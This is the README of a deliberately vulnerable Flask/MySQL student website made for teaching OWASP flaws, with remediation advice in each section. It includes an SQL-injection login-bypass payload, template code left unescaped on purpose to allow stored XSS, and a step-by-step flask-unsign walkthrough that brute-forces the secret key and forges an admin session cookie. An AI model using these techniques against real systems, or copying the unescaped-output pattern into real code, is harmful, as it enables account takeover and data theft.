# VulnerableWebsite
* This a `Student Management` website build on Flask and MySQL database for demonstrating OWASP vulnerabilities.
* The website features user registration and login, profile viewing and discussion posting functionalities.
* User with username `admin` when created can view profiles for all registered users on its `Profile` page. All other users can only view thier own profile details.
* Every user can post comments and view comments posted by all other users on `Discussions` page.

## How to run
* Prerequisite: Install Docker Desktop.
* Clone this repository `https://github.com/RohanKumarSachdeva/VulnerableWebsite`.
* Change the directory to `VulnerableWebsite`
* Run `docker-compose up`
* Browse to `http://127.0.0.1:5000/` to access the application.

#### Note: Register a user with username `admin` to unlock admin profile viewing feature.

## OWASP vulnerabilities Detail and their Remediations
### 1. SQL Injection:
#### Attack Details:
This vulnerability allows an attacker to interfere with the queries that an application makes to its database by
**subverting the query logic**.
Our vulnerable application lets users log in with a username and password. If a user submits the username `adam` and the password `qwerty`, the application checks the credentials by concatenating them as shown below, and forms a SQL query:
> "SELECT * FROM accounts WHERE username=" + username + " AND password=" + password

Which transforms to:
> SELECT * FROM users WHERE username = 'adam' AND password = 'qwerty'

If the query returns the details of a user, then the login is successful. Otherwise, it is rejected.

Here, an attacker can log in as any user without a password simply by using the SQL comment sequence `-- ` which will comment out the password check from the `WHERE` clause of the query. For example, submitting the username **`admin'-- `** and a blank/wrong password results in the following query:
> SELECT * FROM users WHERE username = 'admin'-- ' AND password = ''

This query returns the user details **in-band**, if its username `admin` exists in the database and successfully logs the attacker in as that user. Since `admin` in our application has capability to view details of all registered users, the attacker will now be able to view this information.

#### Remediation Steps: Following are the best practices to avoid SQL Injection
* **Using Prepared/Parameterized statements**. These are pre-compiled SQL statements. The query is already pre-compiled, so the final query will not go through the compilation phase again. For this reason, the user-provided data will always be interpreted as a simple string and cannot modify the original query’s logic. Hence to fix the vulnerability in our application we can use the following parameterized statement where `%s` are placeholders used for parameters that will be supplied during execution time.
> 'SELECT * FROM accounts WHERE username = %s AND password = %s', (username, password)

* **Escaping of user data**. If a parameterized API is not available, we should carefully escape special characters present in the user supplied input. Escaping involves adding a special character before the character/string to avoid it being misinterpreted, for example, adding a `\` character before a `"(double quote)` character so that it is interpreted as text and not as closing a string.

* **HtmlEncode all user input.** Encoding (commonly called “Output Encoding”) involves translating special characters into some different but equivalent form that is no longer dangerous in the target interpreter, for example translating the `<` character into the `&lt`. We can use this technique to further sanitize user input in our application.


### 2. Stored Cross Site Scripting (XSS): can cause RCE
#### Attack Details:
Stored XSS arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way. The data in question might be submitted to the application via HTTP requests; for example in our vulnerable application users can use the **Discussion Section** to post comments which get saved to the database. All comments are visible to every registered user, hence if an attacker has injected Javascript via comment it gets saved to the database, and whenever any user loads this discussion section server will return this script. An attacker can craft the Javascript to perform **RCE** that may steal cookies, saved passwords, or CSRF tokens and relay them back to the attacker-controlled domain.

Deep diving into our application code we see the 2 main causes of this vulnerability.
* **No validation/sanitization** of user data before inserting it into database.
```
  # get user comment and insert into discussion table
  comment = request.form['discussion']
  user_id = session["id"]
  user_name = session["username"]
  cursor.execute('INSERT INTO discussions VALUES (NULL, %s, %s, %s)', (user_id, user_name, comment))
  connection.commit()
 ```
            
* **Considering user data to be safe** by using `|safe` tag that renders string without escaping.
```
  {% for row in data %}
    <div>
        <p>{{ row[2] }} commented:</p>
        <p>{{ row[3]|safe }}</p>
    </div>
  {% endfor %}
```
#### Remediation Steps:
* **Filter input on arrival.** At the point where user input is received, filter as strictly as possible based on what is expected or valid input
  - Construct strict **Syntax and Semantic** rules to validate user input.
  - Construct **Whitelisting and Blacklisting** of expected and unexpected user data.
  - Construct **Regular expressions** to validate user input.

* **Output Encoding for “HTML Contexts”.**  Output Encoding is recommended when we need to safely display data exactly as a user typed it in.
Hence in order to add a variable to a HTML context safely, HTML entity encoding should be used for that variable as we add it to a web template. Flask has default encoding capability ([Reference Link](https://flask.palletsprojects.com/en/1.1.x/templating/#controlling-autoescaping)), hence to fix the vulnerability in our code we should remove the `|safe` tag so that Flask can encode the string value before adding it to HTML.

### 3. Session Hijacking:
#### Attack Details:
The disclosure, capture, prediction, brute force, or fixation of the session ID will lead to session hijacking (or sidejacking) attacks, where an attacker is able to fully impersonate a victim user in the web application. Our application is vulnerable to **session hijacking and session fixation** which can be explioted by using tools like **flask-unsign**. Flask-unsign ([Download Link](https://pypi.org/project/flask-unsign/)) is a command line tool to fetch, decode, brute-force and craft session cookies of a Flask application by guessing secret keys. Below are the steps on how to exploit the session vulnerability in our flask application:

* **Step 1:**
  - Login to the website and use inspect element to retrieve the server supplied cookie value.
  - Decode the above retrieved session cookie using flask-unsign.
  ```
  flask-unsign --decode --cookie 'eyJpZCI6MSwibG9nZ2VkaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Y6-xzg.NeUwSfTaH1n2gWd5qhqSsNv-7Tk'
  ```
  - Output: decoded cookie value.
  ```
  {'id': 1, 'loggedin': True, 'username': 'test'}
  ```

* **Step 2:**
  - Use wordlist ([Download Link](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&ved=2ahUKEwjstLrx8af8AhX8-DgGHQJyA0UQFnoECBMQAQ&url=https%3A%2F%2Fgithub.com%2Fbrannondorsey%2Fnaive-hashcat%2Freleases%2Fdownload%2Fdata%2Frockyou.txt&usg=AOvVaw3snAERl1mU6Ccr4WFEazBd)) of common passwords to bruteforce the secret key.
   ```
   flask-unsign --wordlist rockyou.txt --unsign --cookie 'eyJpZCI6MSwibG9nZ2VkaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Y6-xzg.NeUwSfTaH1n2gWd5qhqSsNv-7Tk'  --no-literal-eval
   ```
  - Output: API key **`s3cr3t`** obtained via brute-force.
  ```
  [*] Session decodes to: {'id': 1, 'loggedin': True, 'username': 'test'}
  [*] Starting brute-forcer with 8 threads..
  [+] Found secret key after 70144 attempts
  b's3cr3t'
  ```

* **Step 3:**
  - Craft a session cookie using the secret obtained in Step 2.
  ```
   flask-unsign --sign --cookie "{'id': 2, 'loggedin': True, 'username': 'admin'}" --secret 's3cr3t'
  ```

  - Output: temporary cookie for username **`admin`**.
  ```
   eyJpZCI6MiwibG9nZ2VkaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.Y6-0ng.j6FmpIcxhSd8_6URCDmy03sFnX8
  ```

* **Step 4:**
  - Again use the inspect element of the browser to include this crafted cookie in the next request.
  - We will now be logged in as `admin` user and can now view profiles for every registered users.
  - Similar technique can be used to fixate session of any valid user present in the database.
  
#### Remediation Steps:
- Using strong and random API secret_key to avoid bruteforce attacks ([Reference](https://flask.palletsprojects.com/en/0.12.x/quickstart/#sessions)).
- Session ID must be long enough to prevent brute force attacks. The session ID length must be at least 128 bits (16 bytes).
- The session ID must be unpredictable (random enough) to prevent guessing attacks. For this purpose, a good CSPRNG (Cryptographically Secure Pseudorandom Number Generator) should be used to create session IDs.
- Also, an active session should be warned when it is accessed from another location.